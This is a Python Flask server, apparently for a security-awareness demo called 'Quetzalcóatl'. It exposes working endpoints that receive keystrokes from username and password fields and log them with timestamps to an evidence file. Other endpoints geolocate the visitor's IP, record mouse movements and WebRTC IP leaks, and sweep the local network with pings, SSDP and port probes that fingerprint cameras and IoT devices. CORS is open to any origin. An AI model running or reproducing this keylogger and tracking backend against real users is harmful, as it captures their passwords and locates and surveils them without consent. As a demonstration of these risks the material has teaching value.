from flask import Flask, request, jsonify, send_file
import requests
import os
import struct
import ipaddress
import socket
import subprocess
import platform
import concurrent.futures
import time
from datetime import datetime
from flask import jsonify

app = Flask(__name__)

# Configuración del archivo de evidencia
ARCHIVO_EVIDENCIA = "evidencia_quetzalcoatl.txt"

# Función auxiliar para escribir evidencia con timestamp
def registrar_evidencia(tipo_campo, tecla, buffer_completo):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [SISTEMA] Intercepción en '{tipo_campo}': Tecla capturada: '{tecla}' | Buffer acumulado: {buffer_completo}\n"
    with open(ARCHIVO_EVIDENCIA, "a") as f:
        f.write(log_entry)


# ==========================================
# RUTAS PARA SERVIR ARCHIVOS (FRONTEND)
# ==========================================

def obtener_red_local():
    """
    Enumera TODAS las interfaces de red, filtra loopback y VPN (/32, utun, tun),
    y elige la mejor interfaz LAN real (prefiere 192.168.x, luego 10.x).
    Limita el escaneo a /24 para que la demo sea ágil.
    """
    candidatos = []  # lista de (ip, prefijo, red_obj)

    try:
        if platform.system() == 'Darwin':  # macOS
            resultado = subprocess.check_output(['ifconfig'], text=True)
            interfaz_actual = None
            for linea in resultado.split('\n'):
                # Detectar nombre de interfaz (línea sin indentación)
                if linea and not linea.startswith('\t') and not linea.startswith(' '):
                    interfaz_actual = linea.split(':')[0]
                # Buscar líneas con inet (IPv4)
                if 'inet ' in linea and 'netmask' in linea and interfaz_actual:
                    # Ignorar loopback y túneles VPN
                    if interfaz_actual == 'lo0' or interfaz_actual.startswith('utun') \
                            or interfaz_actual.startswith('tun') or interfaz_actual.startswith('ppp'):
                        continue
                    try:
                        partes = linea.split()
                        ip = partes[partes.index('inet') + 1]
                        if ip.startswith('127.'):
                            continue
                        hex_mask = partes[partes.index('netmask') + 1]
                        if hex_mask.startswith('0x'):
                            val = int(hex_mask, 16)
                            mascara_str = socket.inet_ntoa(struct.pack('>I', val))
                            red_obj = ipaddress.IPv4Network(f"{ip}/{mascara_str}", strict=False)
                            if red_obj.prefixlen < 32:  # descartar /32 (VPN puntual)
                                candidatos.append((ip, red_obj.prefixlen, red_obj))
                    except (ValueError, IndexError):
                        continue

        elif platform.system() == 'Linux':
            resultado = subprocess.check_output(['ip', 'addr'], text=True)
            interfaz_actual = None
            for linea in resultado.split('\n'):
                if linea and not linea.startswith(' ') and not linea.startswith('\t'):
                    partes = linea.split(':')
                    if len(partes) >= 2:
                        interfaz_actual = partes[1].strip().split('@')[0]
                if 'inet ' in linea and '/' in linea and interfaz_actual:
                    if interfaz_actual in ['lo'] or interfaz_actual.startswith('tun') \
                            or interfaz_actual.startswith('virbr') or interfaz_actual.startswith('docker'):
                        continue
                    try:
                        partes = linea.split()
                        cidr = partes[partes.index('inet') + 1]
                        ip, pref = cidr.split('/')
                        if ip.startswith('127.'):
                            continue
                        prefijo = int(pref)
                        if prefijo < 32:
                            red_obj = ipaddress.IPv4Network(f"{ip}/{prefijo}", strict=False)
                            candidatos.append((ip, prefijo, red_obj))
                    except (ValueError, IndexError):
                        continue

    except Exception:
        pass

    # Ordenar candidatos: primero 192.168.x (WiFi doméstica/uni),
    # luego 172.x, luego 10.x. En empate, preferir red más grande (prefijo menor).
    def puntuacion(c):
        ip, prefijo, _ = c
        if ip.startswith('192.168.'):
            return (0, prefijo)
        elif ip.startswith('172.'):
            return (1, prefijo)
        elif ip.startswith('10.'):
            return (2, prefijo)
        return (3, prefijo)

    candidatos.sort(key=puntuacion)

    if candidatos:
        mi_ip, prefijo, _ = candidatos[0]
        # Limitar a /24 para que el escaneo tarde segundos, no minutos
        prefijo = min(prefijo, 24)
        red = ipaddress.IPv4Network(f"{mi_ip}/{prefijo}", strict=False)
        return mi_ip, red

    # Fallback absoluto: ruta hacia 8.8.8.8, forzar /24
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    mi_ip = s.getsockname()[0]
    s.close()
    red = ipaddress.IPv4Network(f"{mi_ip}/24", strict=False)
    return mi_ip, red


@app.route('/api/scan_arp', methods=['GET'])
def scan_arp():
    try:
        mi_ip, red = obtener_red_local()
        ip_bcast   = str(red.broadcast_address)

        # ── Helpers ───────────────────────────────────────────────────────────
        def _gateway():
            gw = None
            try:
                if platform.system() == 'Darwin':
                    try:
                        out = subprocess.check_output(
                            ['route', '-n', 'get', 'default'], text=True, timeout=2)
                        for l in out.split('\n'):
                            if 'gateway' in l and ':' in l:
                                gw = l.split(':')[1].strip(); break
                    except Exception:
                        pass
                    if not gw:
                        out = subprocess.check_output(['netstat', '-rn'], text=True, timeout=2)
                        for l in out.split('\n'):
                            p = l.split()
                            if p and p[0] == 'default' and len(p) > 1:
                                try: ipaddress.IPv4Address(p[1]); gw = p[1]; break
                                except ValueError: pass
                elif platform.system() == 'Linux':
                    out = subprocess.check_output(
                        ['ip', 'route', 'show', 'default'], text=True, timeout=2)
                    p = out.split()
                    if 'via' in p: gw = p[p.index('via') + 1]
            except Exception:
                pass
            return gw

        def _ssdp():
            found = set()
            msg = (b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\n'
                   b'Man: "ssdp:discover"\r\nST: ssdp:all\r\nMX: 2\r\n\r\n')
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.settimeout(1.5)
                    s.sendto(msg, ('239.255.255.250', 1900))
                    while True:
                        try:
                            _, addr = s.recvfrom(4096)
                            found.add(addr[0])
                        except socket.timeout:
                            break
            except Exception:
                pass
            return found

        def _leer_arp():
            tabla = {}
            try:
                out = subprocess.check_output(['arp', '-a'], text=True, timeout=2)
                for l in out.split('\n'):
                    if '(' not in l or ')' not in l or 'incomplete' in l:
                        continue
                    try:
                        ip  = l.split('(')[1].split(')')[0]
                        mac = l.split('at ')[1].split(' ')[0] if 'at ' in l else 'Desconocida'
                        if mac != 'ff:ff:ff:ff:ff:ff' and not ip.endswith('.255') \
                                and '224.' not in ip and '239.' not in ip:
                            tabla[ip] = mac
                    except Exception:
                        pass
            except Exception:
                pass
            return tabla

        def _hostname_safe(ip):
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
                try:
                    return ex.submit(socket.gethostbyaddr, ip).result(timeout=1.0)[0]
                except Exception:
                    return None

        # ── Descubrimiento ────────────────────────────────────────────────────
        ips_mac = {}
        gw = None

        # Gateway y SSDP en paralelo mientras hacemos el ping sweep
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as ex:
            f_gw   = ex.submit(_gateway)
            f_ssdp = ex.submit(_ssdp)
            # Ping broadcast para redes domésticas (no bloqueante del resultado)
            ex.submit(lambda: subprocess.run(
                ['ping', '-c', '1', ip_bcast],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2))

            try:
                gw = f_gw.result(timeout=2)
            except Exception:
                pass

            try:
                for ip in f_ssdp.result(timeout=2):
                    if ip != mi_ip:
                        ips_mac[ip] = 'Desconocida'
            except Exception:
                pass

        # Ping sweep paralelo: despierta dispositivos y llena la tabla ARP.
        # 50 workers = equilibrio entre velocidad y carga del SO.
        # -W 300 = 300ms timeout ICMP en macOS (evita los 2s por defecto).
        hosts_local = [str(h) for h in red.hosts() if str(h) != mi_ip]

        def _ping_arp(ip):
            try:
                subprocess.run(
                    ['ping', '-c', '1', '-W', '300', ip],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=0.6)
            except Exception:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
            list(ex.map(_ping_arp, hosts_local))

        # Leer ARP después de que los pings poblaron la tabla
        for ip, mac in _leer_arp().items():
            if ip != mi_ip:
                ips_mac[ip] = mac

        # Gateway siempre presente aunque no responda ping
        if gw and gw != mi_ip:
            ips_mac[gw] = ips_mac.get(gw, 'Desconocida')

        nodos_encontrados = list(ips_mac.items())

        # ── Fingerprinting — puertos en paralelo, hostname con timeout ────────
        PUERTOS = [22, 80, 81, 443, 554, 1900, 3702, 5000, 8008, 8080, 8899, 9000, 34567, 37777]

        def interrogar(nodo):
            ip, mac = nodo

            def check_port(p):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(0.5)
                        return p if s.connect_ex((ip, p)) == 0 else None
                except Exception:
                    return None

            with concurrent.futures.ThreadPoolExecutor(max_workers=len(PUERTOS)) as pex:
                puertos_abiertos = [p for p in pex.map(check_port, PUERTOS) if p]

            hostname = _hostname_safe(ip)

            vendor = None
            if mac not in ('Desconocida', 'ff:ff:ff:ff:ff:ff'):
                try:
                    r = requests.get(
                        f"https://api.maclookup.app/v2/macs/{mac}", timeout=1.5)
                    data = r.json()
                    if data.get('found'):
                        vendor = data.get('company', '')[:32]
                except Exception:
                    pass

            tipo = "Dispositivo Físico / Computadora"
            icono = "💻"
            clase = "router"

            if ip == gw or ip.endswith('.1') or ip.endswith('.254'):
                tipo = "Router / Módem Principal"; icono = "🌐"; clase = "router"
            elif any(p in puertos_abiertos for p in [554, 34567, 37777, 8899]):
                tipo = "Cámara de Seguridad"; icono = "📷"; clase = "camara"
            elif 8008 in puertos_abiertos:
                tipo = "Smart TV / Pantalla"; icono = "📺"; clase = "smarttv"
            elif 81 in puertos_abiertos or 3702 in puertos_abiertos or 9000 in puertos_abiertos:
                tipo = "Cámara de Seguridad"; icono = "📷"; clase = "camara"
            elif 1900 in puertos_abiertos or 5000 in puertos_abiertos:
                tipo = "Asistente de Voz / IoT"; icono = "🔊"; clase = "asistente"
            elif 22 in puertos_abiertos and (80 in puertos_abiertos or 443 in puertos_abiertos):
                tipo = "Servidor / NAS"; icono = "🖥️"; clase = "router"
            elif 8080 in puertos_abiertos:
                tipo = "Servidor Web / Dispositivo"; icono = "🖥️"; clase = "router"
            elif mac != 'Desconocida' and len(mac) >= 2:
                if mac[1].lower() in ['2', '6', 'a', 'e']:
                    tipo = "Teléfono Móvil / Tablet"; icono = "📱"; clase = "celular"

            return {
                "ip": ip, "mac": mac, "tipo": tipo,
                "icono": icono, "clase": clase,
                "hostname": hostname, "vendor": vendor,
                "puertos": puertos_abiertos
            }

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            dispositivos = list(executor.map(interrogar, nodos_encontrados))

        dispositivos.append({
            "ip": mi_ip, "mac": "Host Local",
            "tipo": "Tu Equipo (Servidor RuloSec)",
            "icono": "🧠", "clase": "db",
            "hostname": None, "vendor": None, "puertos": []
        })

        return jsonify({
            "status": "success",
            "devices": dispositivos,
            "red_detectada": str(red),
            "total_hosts_escaneados": len([str(h) for h in red.hosts()])
        })

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route('/')
def inicio():
    return send_file('index.html')

@app.route('/script.js')
def servir_script():
    return send_file('script.js')

@app.route('/<path:filename>')
def servir_archivos_estaticos(filename):
    if filename.endswith('.png'):
        return send_file(filename)
    return "Archivo no encontrado", 404


# ==========================================
# ENDPOINTS DE LA API (BACKEND)
# ==========================================

@app.route('/api/ip', methods=['POST'])
def obtener_ip():
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()

    if ip_cliente == '127.0.0.1':
        try:
            ip_cliente = requests.get('https://api.ipify.org', timeout=3).text
        except Exception:
            pass

    url = f"http://ip-api.com/json/{ip_cliente}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,as,query"

    try:
        respuesta = requests.get(url, timeout=5).json()
    except Exception:
        respuesta = {}

    return jsonify({
        "ip": respuesta.get("query", ip_cliente),
        "pais": respuesta.get("country", "Desconocido"),
        "estado": respuesta.get("regionName", "Desconocido"),
        "ciudad": respuesta.get("city", "Desconocida"),
        "codigo_postal": respuesta.get("zip", "Desconocido"),
        "latitud": respuesta.get("lat", 0),
        "longitud": respuesta.get("lon", 0),
        "isp": respuesta.get("isp", "Desconocido"),
        "asn": respuesta.get("as", "Desconocido"),
        "zona_horaria": respuesta.get("timezone", "Desconocido")
    }), 200


@app.route('/api/keylogger', methods=['POST'])
def keylogger_endpoint():
    datos = request.get_json()
    if datos:
        tecla = datos.get('tecla', '')
        field_context = datos.get('field', 'Desconocido')
        texto_actual = datos.get('texto_actual', '')

        if field_context == 'user-input':
            label_terminal = "👤 Usuario"
            label_archivo = "Campo Usuario (rulo_@)"
        elif field_context == 'pass-input':
            label_terminal = "🔑 Contraseña"
            label_archivo = "Campo Contraseña (!312)"
        else:
            label_terminal = "❓ Desconocido"
            label_archivo = field_context

        print(f"\033[91m[ALERTA KEYLOGGER - {label_terminal}] Contraseña actual: '{texto_actual}' (Tecla: '{tecla}')\033[0m")
        registrar_evidencia(label_archivo, tecla, texto_actual)

    return jsonify({"status": "ok"}), 200


@app.route('/api/raton', methods=['POST'])
def raton_endpoint():
    datos = request.get_json()
    if datos:
        print(f"\033[94m[BIOMETRÍA] Posición X: {datos.get('x')} | Y: {datos.get('y')}\033[0m")
    return jsonify({"status": "ok"}), 200


@app.route('/api/escaner', methods=['POST'])
def escaner_endpoint():
    datos = request.get_json()
    if datos:
        print(f"\033[92m[ESCÁNER RED] Host: {datos.get('objetivo')} | Estado: {datos.get('estado')} | Latencia: {datos.get('tiempo')}ms\033[0m")
    return jsonify({"status": "ok"}), 200


@app.route('/api/webrtc', methods=['POST'])
def webrtc_endpoint():
    datos = request.get_json()
    if datos:
        print(f"\033[93m[FUGA WebRTC] IP {datos.get('tipo')} detectada: {datos.get('ip')}\033[0m")
    return jsonify({"status": "ok"}), 200


# ==========================================
# CONFIGURACIÓN DE CORS Y ARRANQUE
# ==========================================

@app.after_request
def add_cors_headers(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response


if __name__ == '__main__':
    print("\n\033[95m[SISTEMA QUETZALCÓATL] Servidor de Inteligencia corriendo en puerto 5001...\033[0m")
    print(f"\033[95m[SISTEMA QUETZALCÓATL] Evidencia del keylogger se guardará en: {ARCHIVO_EVIDENCIA}\033[0m")
    app.run(host='0.0.0.0', port=5001, debug=False)